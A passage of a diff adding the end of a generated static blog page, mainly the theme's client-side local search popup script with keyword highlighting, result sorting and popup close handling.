+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <script type="text/javascript" src="/js/src/clicklove.js"></script>
+
+</body>
+</html>
